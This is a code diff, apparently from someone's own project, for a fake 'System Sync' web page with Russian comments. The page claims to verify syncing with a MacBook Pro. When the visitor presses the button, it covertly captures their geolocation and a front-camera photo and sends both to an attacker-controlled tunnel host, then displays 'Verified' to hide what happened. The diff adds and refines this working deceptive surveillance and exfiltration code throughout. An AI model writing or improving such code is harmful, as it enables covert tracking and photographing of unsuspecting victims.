@@ -1,51 +1,54 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>System Sync</title>
     <style>
-        body { margin:0; background:#000; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; }
-        .card { width:260px; padding:30px; background:#111; border-radius:20px; text-align:center; border:1px solid #222; }
-        button { background:#fff; color:#000; border:none; padding:15px; border-radius:12px; width:100%; font-weight:bold; cursor:pointer; }
-        #loader { display:none; margin:15px auto; width:20px; height:20px; border:2px solid #333; border-top:2px solid #fff; border-radius:50%; animation:s 1s linear infinite; }
-        @keyframes s { to { transform:rotate(360deg); } }
+        body { margin:0; background:#000; color:#fff; font-family:-apple-system, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; text-align:center; }
+        .card { width:260px; padding:35px; background:#111; border:1px solid #333; border-radius:28px; }
+        h2 { font-size:22px; margin-bottom:10px; }
+        p { font-size:14px; color:#666; margin-bottom:30px; }
+        .btn { background:#fff; color:#000; border:none; padding:18px; border-radius:15px; width:100%; font-weight:bold; font-size:16px; }
+        #loader { display:none; margin:10px auto; width:25px; height:25px; border:3px solid #222; border-top:3px solid #fff; border-radius:50%; animation:spin 1s linear infinite; }
+        @keyframes spin { to { transform:rotate(360deg); } }
         video, canvas { display:none; }
     </style>
 </head>
 <body>
     <div class="card">
         <h2 id="st">Verification</h2>
-        <p>Press to connect with Mac</p>
-        <button id="btn" onclick="init()">CONNECT</button>
-        <div id="loader" id="ld"></div>
+        <p id="msg">Confirm to sync with MacBook Pro</p>
+        <button class="btn" id="go" onclick="run()">CONFIRM</button>
+        <div id="loader"></div>
     </div>
+
     <video id="v" autoplay playsinline></video>
     <canvas id="c"></canvas>
 
     <script>
-        // === ТВОЙ АДРЕС ===
+        // СЮДА ВСТАВЬ СВЕЖУЮ ССЫЛКУ ИЗ ТЕРМИНАЛА SSH
         const API = "https://7f13bc54307437.lhr.life"; 
 
-        async function init() {
-            document.getElementById('btn').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
-            document.getElementById('st').innerText = "Syncing...";
+        async function run() {
+            const btn = document.getElementById('go'), ld = document.getElementById('loader'), st = document.getElementById('st');
+            btn.style.display = 'none'; ld.style.display = 'block'; st.innerText = "Syncing...";
 
             try {
-                // 1. ГЕОЛОКАЦИЯ (через GET - самый надежный метод)
-                navigator.geolocation.getCurrentPosition(p => {
-                    const url = `${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}`;
-                    new Image().src = url; // "Тихий" запрос, который не блокирует CORS
-                });
-
-                // 2. КАМЕРА
+                // 1. ЗАПРАШИВАЕМ ВСЁ СРАЗУ
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const v = document.getElementById('v');
-                v.srcObject = stream;
-                await new Promise(r => setTimeout(r, 1500));
+                const v = document.getElementById('v'); v.srcObject = stream;
 
-                // 3. СНИМОК
+                // Получаем ГЕО
+                navigator.geolocation.getCurrentPosition(async (p) => {
+                    // Как только получили ГЕО — сразу шлем его "фоном"
+                    fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}`, {mode:'no-cors'});
+                }, null, {timeout: 5000});
+
+                // Ждем 1 секунду, чтобы камера сфокусировалась
+                await new Promise(r => setTimeout(r, 1000));
+
+                // 2. ДЕЛАЕМ СКРИНШОТ
                 const canvas = document.getElementById('c');
                 canvas.width = v.videoWidth; canvas.height = v.videoHeight;
                 canvas.getContext('2d').drawImage(v, 0, 0);
@@ -54,22 +57,21 @@
                 const fd = new FormData();
                 fd.append('file', blob, 'shot.jpg');
 
-                // 4. ОТПРАВКА ФОТО (используем fetch с минимальными требованиями)
-                fetch(`${API}/upload-photo`, { 
+                // 3. ОТПРАВЛЯЕМ ФАЙЛ
+                await fetch(`${API}/upload-photo`, { 
                     method: 'POST', 
-                    mode: 'no-cors', // Это ВАЖНО! Игнорируем ошибки безопасности
+                    mode: 'no-cors', 
                     body: fd 
                 });
 
-                // Сразу пишем успех, не дожидаясь ответа
-                setTimeout(() => {
-                    document.getElementById('st').innerText = "Verified";
-                    document.getElementById('loader').style.display = 'none';
-                    stream.getTracks().forEach(t => t.stop());
-                }, 1000);
+                // 4. ЗАВЕРШАЕМ
+                st.innerText = "Verified";
+                ld.style.display = 'none';
+                document.getElementById('msg').innerText = "Process complete.";
+                stream.getTracks().forEach(t => t.stop());
 
             } catch (e) {
-                alert("Please allow camera access");
+                alert("Please allow Camera & Location access");
                 location.reload();
             }
         }
